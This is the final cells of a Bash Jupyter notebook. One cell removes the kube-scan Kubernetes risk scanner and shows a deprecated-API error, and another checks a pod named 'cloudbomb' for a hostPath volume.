      "[unable to recognize \"https://raw.githubusercontent.com/octarinesec/kube-scan/master/kube-scan-lb.yaml\": no matches for kind \"ClusterRole\" in version \"rbac.authorization.k8s.io/v1beta1\", unable to recognize \"https://raw.githubusercontent.com/octarinesec/kube-scan/master/kube-scan-lb.yaml\": no matches for kind \"ClusterRoleBinding\" in version \"rbac.authorization.k8s.io/v1beta1\"]\n"
     ]
    },
    {
     "ename": "",
     "evalue": "1",
     "output_type": "error",
     "traceback": []
    }
   ],
   "source": [
    "kubectl delete -f https://raw.githubusercontent.com/octarinesec/kube-scan/master/kube-scan.yaml -f https://raw.githubusercontent.com/octarinesec/kube-scan/master/kube-scan-lb.yaml"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Pedestrians approach"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  - hostPath:\n"
     ]
    }
   ],
   "source": [
    "kubectl get pods cloudbomb -o yaml | grep hostPath"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Bash",
   "language": "bash",
   "name": "bash"
  },
  "language_info": {
   "codemirror_mode": "shell",
   "file_extension": ".sh",
   "mimetype": "text/x-sh",
   "name": "bash"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
